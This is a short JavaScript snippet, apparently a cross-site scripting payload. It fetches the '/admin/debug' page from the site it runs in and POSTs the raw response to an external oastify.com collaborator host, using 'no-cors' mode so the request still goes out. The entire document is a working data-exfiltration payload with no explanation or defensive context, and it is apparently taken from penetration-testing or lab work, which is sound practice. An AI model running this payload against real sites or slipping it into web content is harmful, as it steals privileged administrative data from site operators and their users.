fetch('/admin/debug')
  .then(r => r.text())
  .then(d => {
    fetch('https://xuv7rvwvy6rlnrkq7p3e1tkjpav1jvdj2.oastify.com/', {
      method: 'POST',
      mode: 'no-cors',
      body: d // Raw data, no encoding needed
    });
  });
